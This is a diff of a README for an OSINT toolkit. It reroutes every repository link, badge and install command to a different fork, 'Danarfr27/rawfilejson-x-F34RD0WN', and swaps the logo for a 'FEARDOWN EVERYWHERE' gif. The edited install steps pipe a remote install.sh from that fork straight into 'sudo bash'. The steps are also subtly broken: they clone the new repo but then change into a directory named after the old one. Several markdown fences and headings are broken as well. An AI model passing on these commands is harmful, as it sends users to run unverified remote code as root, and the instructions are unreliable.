@@ -1,20 +1,20 @@
 <div align="center">
 
-<img src="assets/osint_arsenal_logo.png" width="1200" alt="OSINT Arsenal"/>
+<img src="feardown_everywhere.gif" width="1200" alt="FEARDOWN EVERYWHERE GIF"/>
 
 <br/>
 
-# 🔍 AWESOME OSINT ARSENAL
+# 🔍 AWESOME OSINT
 
 ### The Ultimate Open-Source Intelligence + Security Toolkit
 
 <br/>
 
-[![Tools](https://img.shields.io/badge/Tools-753%2B-FF4444?style=for-the-badge&logo=target&logoColor=white)](https://github.com/rawfilejson/awesome-osint-arsenal)
-[![Categories](https://img.shields.io/badge/Categories-50-0066CC?style=for-the-badge&logo=buffer&logoColor=white)](https://github.com/rawfilejson/awesome-osint-arsenal)
-[![Version](https://img.shields.io/badge/Version-2.1-00CC66?style=for-the-badge&logoColor=white)](https://github.com/rawfilejson/awesome-osint-arsenal)
-[![Updated](https://img.shields.io/badge/Updated-2026--05--10-FF8800?style=for-the-badge&logoColor=white)](https://github.com/rawfilejson/awesome-osint-arsenal)
-[![Stars](https://img.shields.io/github/stars/rawfilejson/awesome-osint-arsenal?style=for-the-badge&color=gold&logo=github)](https://github.com/rawfilejson/awesome-osint-arsenal/stargazers)
+[![Tools](https://img.shields.io/badge/Tools-753%2B-FF4444?style=for-the-badge&logo=target&logoColor=white)](https://github.com/Danarfr27/rawfilejson-x-F34RD0WN.git)
+[![Categories](https://img.shields.io/badge/Categories-50-0066CC?style=for-the-badge&logo=buffer&logoColor=white)](https://github.com/Danarfr27/rawfilejson-x-F34RD0WN.git)
+[![Version](https://img.shields.io/badge/Version-2.1-00CC66?style=for-the-badge&logoColor=white)](https://github.com/Danarfr27/rawfilejson-x-F34RD0WN.git)
+[![Updated](https://img.shields.io/badge/Updated-2026--05--10-FF8800?style=for-the-badge&logoColor=white)](https://github.com/Danarfr27/rawfilejson-x-F34RD0WN.git)
+[![Stars](https://img.shields.io/github/stars/Danarfr27/rawfilejson-x-F34RD0WN?style=for-the-badge&color=gold&logo=github)](https://github.com/Danarfr27/rawfilejson-x-F34RD0WN.git/stargazers)
 
 <br/>
 
@@ -29,7 +29,7 @@
 ### ⚡ Get everything in one command
 
 ```bash
-git clone https://github.com/rawfilejson/awesome-osint-arsenal && cd awesome-osint-arsenal && sudo bash install.sh
+git clone https://github.com/Danarfr27/rawfilejson-x-F34RD0WN.git && cd awesome-osint-arsenal && sudo bash install.sh
 ```
 
 ### 🎯 Or pick just what you need
@@ -249,7 +249,7 @@ bash termux.sh            # 📱 Android (Termux subset, no sudo needed)
 ### Quick install — Kali / Debian / Ubuntu / Parrot
 
 ```bash
-git clone https://github.com/rawfilejson/awesome-osint-arsenal
+git clone https://github.com/Danarfr27/rawfilejson-x-F34RD0WN.git
 ```
 
 ```bash
@@ -1564,10 +1564,10 @@ python3 cupp.py -i
 
 ```bash
 # Option 1: Direct from this repo (one command)
-curl -sL https://raw.githubusercontent.com/rawfilejson/awesome-osint-arsenal/main/install.sh | sudo bash
+curl -sL https://raw.githubusercontent.com/Danarfr27/rawfilejson-x-F34RD0WN/main/install.sh | sudo bash
 
 # Option 2: Clone first (recommended — inspect before running)
-git clone https://github.com/rawfilejson/awesome-osint-arsenal.git
+git clone https://github.com/Danarfr27/rawfilejson-x-F34RD0WN.git
 cd awesome-osint-arsenal
 sudo bash install.sh
 ```
@@ -3209,7 +3209,7 @@ done > georgian_names_years.txt
 
 ### Government & Official Sites
 
-```
+
 site:gov.ge filetype:pdf
 site:gov.ge filetype:xlsx
 site:gov.ge filetype:docx
@@ -3409,7 +3409,7 @@ STEP 1: IDENTIFY THE TARGET
   [ ] Certificate Transparency: crt.sh
   [ ] OSINT Telegram bots (Eye of God, Quick OSINT)
 ```
-### Appendix C: Key URLs Quick Reference
+ Appendix C: Key URLs Quick Reference
 
 | Category | URL |
 |---|---|
@@ -3441,7 +3441,7 @@ STEP 1: IDENTIFY THE TARGET
 | Open Data Procurement | [https://opendata.spa.ge](https://opendata.spa.ge) |
 
 ---
-![OSINT Arsenal Logo](https://raw.githubusercontent.com/rawfilejson/awesome-osint-arsenal/main/assets/logo.jpg)
+<img src="feardown_everywhere.gif" width="1200" alt="FEARDOWN EVERYWHERE GIF"/>
 🔍 AWESOME OSINT ARSENAL
 The Ultimate Open-Source Intelligence Toolkit
 
@@ -3452,11 +3452,11 @@ The Ultimate Open-Source Intelligence Toolkit
 </details>
 
 ---
-## 🤝 Contributing & Issues
+##🤝 Contributing & Issues
 
 Found a dead link? Tool that should be here? Just open an issue or PR.
 
-- **Found something broken** → [open an issue](https://github.com/rawfilejson/awesome-osint-arsenal/issues/new)
+- **Found something broken** → [open an issue](https://github.com/Danarfr27/rawfilejson-x-F34RD0WN.git/issues/new)
 - **Want to add a tool** → fork, add it to the right section in alphabetical order, PR
 - **No time to PR?** → leave the tool name + URL in an issue, I'll add it
 
@@ -3502,8 +3502,8 @@ This repository is provided for **educational and authorized security research p
 
 **⭐ Star this repo if you found it useful!**
 
-[![GitHub stars](https://img.shields.io/github/stars/rawfilejson/awesome-osint-arsenal?style=social)](https://github.com/rawfilejson/awesome-osint-arsenal/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/rawfilejson/awesome-osint-arsenal?style=social)](https://github.com/rawfilejson/awesome-osint-arsenal/network/members)
+[![GitHub stars](https://img.shields.io/github/stars/Danarfr27/rawfilejson-x-F34RD0WN?style=social)](https://github.com/Danarfr27/rawfilejson-x-F34RD0WN.git/stargazers)
+[![GitHub forks](https://img.shields.io/github/forks/Danarfr27/rawfilejson-x-F34RD0WN?style=social)](https://github.com/Danarfr27/rawfilejson-x-F34RD0WN.git/network/members)
 
 <br/>
 
